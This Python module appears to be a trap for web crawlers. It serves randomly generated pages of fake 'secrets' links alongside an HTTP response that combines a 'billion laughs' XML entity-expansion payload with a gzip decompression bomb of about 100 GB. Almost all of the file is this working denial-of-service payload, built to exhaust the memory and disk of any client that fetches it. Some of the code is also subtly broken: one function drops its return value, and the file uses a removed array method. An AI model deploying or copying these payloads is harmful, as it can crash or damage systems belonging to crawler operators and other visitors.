from replacer import replacerFile

import gzip

import random,time
from array import array

def dorp(a):
    # should be printable, biased towards low, but above 32
    a.extend(
        chr(int(random.random()**3*10000+32)) \
        for i in range(random.randint(100,200)))
    
def billionLaughs(prefix):
    return '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE {p}z [
 <!ENTITY {p} "{p}">
 <!ELEMENT {p}z (#PCDATA)>
 <!ENTITY {p}1 "&{p};&{p};&{p};&{p};&{p};&{p};&{p};&{p};&{p};&{p};">
 <!ENTITY {p}2 "&{p}1;&{p}1;&{p}1;&{p}1;&{p}1;&{p}1;&{p}1;&{p}1;&{p}1;&{p}1;">
 <!ENTITY {p}3 "&{p}2;&{p}2;&{p}2;&{p}2;&{p}2;&{p}2;&{p}2;&{p}2;&{p}2;&{p}2;">
 <!ENTITY {p}4 "&{p}3;&{p}3;&{p}3;&{p}3;&{p}3;&{p}3;&{p}3;&{p}3;&{p}3;&{p}3;">
 <!ENTITY {p}5 "&{p}4;&{p}4;&{p}4;&{p}4;&{p}4;&{p}4;&{p}4;&{p}4;&{p}4;&{p}4;">
 <!ENTITY {p}6 "&{p}5;&{p}5;&{p}5;&{p}5;&{p}5;&{p}5;&{p}5;&{p}5;&{p}5;&{p}5;">
 <!ENTITY {p}7 "&{p}6;&{p}6;&{p}6;&{p}6;&{p}6;&{p}6;&{p}6;&{p}6;&{p}6;&{p}6;">
 <!ENTITY {p}8 "&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;&{p}7;">
 <!ENTITY {p}9 "&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;&{p}8;">
]>
<{p}z>&{p}9;</{p}z>'''.format(p=prefix)

a = array('u')
dorp(a)
billionLaughs = billionLaughs(a.tostring())
del a

def zipbomb(prefix):
    try:
        with open('bomb.gz.bad','rb') as inp:
            return inp.read()
    except FileNotFoundError: pass
    stuff = bytes([0])*100000000
    with replacerFile('bomb.gz.bad') as out:
        g = gzip.GzipFile(mode='w',fileobj=out)
        g.write(prefix.encode('utf-8'))
        for i in range(1000):
            print('stripe',i)
            g.write(stuff)
    # should end up 100 gigabytes
zipbomb = zipbomb(billionLaughs)

def generateBody(a):
    # arrayifying this shaves off a whole 3ms :p
    a.extend('<!DOCTYPE html><html><head><title>')
    dorp(a)
    a.extend('''</title></head>'
<body><p>''')
    for link in range(random.randint(100,200)):
        if random.randrange(0,2)==0:
            a.extend("</p><p>")
        if random.randrange(0,10)==0:
            a.extend("<hr/>")
        if random.randrange(0,6):
            a.extend('\n')
        a.extend('<a href="/art/')
        dorp(a)
        a.extend('/secrets.html">')
        dorp(a)
        a.extend('</a>\n')
    a.extend('</p></body></html>')

def thingy(head,body):
    return (head + b'0\r\n\r\n',
            head + str(len(body)).encode() + b'\r\n\r\n' + \
            body)

    
def zbgen(date):
    body = zipbomb
    head = b'\r\n'.join((
        b'HTTP/1.1 200 OK',
        b'Content-Type: text/html; charset=utf-8',
        b'Date: '+date.encode(),
        b'Content-Encoding: gzip',
        b'Server: Apache',
        b'Content-Length: '
    ))
    return thingy(head,body)    
    
def generate(date):
    a = array('u')
    generateBody(a)
    body = a.tounicode().encode('utf-8')    
    head = b'\r\n'.join((
        b'HTTP/1.1 200 OK',
        b'Content-Type: text/html; charset=utf-8',
        b'Date: '+date.encode(),
        b'Server: Apache',
        b'Content-Length: '
    ))
    thingy(head,body)
    
class BotHelper:
    lastBot = None
    messages = None
    def select(self,date,ip):
        if self.lastBot is None or time.time() - self.lastBot < 100:
            self.messages = [generate(date) for i in range(0x20)]
            self.messages.append(zbgen(date))
            self.lastBot = time.time()
        return random.sample(self.messages,1)[0]

def stresstest():
    print('started at',time.time())
        
    start = time.time()
    for i in range(0x20):
        generate('sometime')
    end = time.time()
    print('generated in',end-start)
    # this will take up 1% of the computer's brain time:
    print('recommended generation interval is ',int(100*(end-start)))

if __name__ == '__main__':
    stresstest()
else:
    import sys
    sys.modules[__name__] = BotHelper()
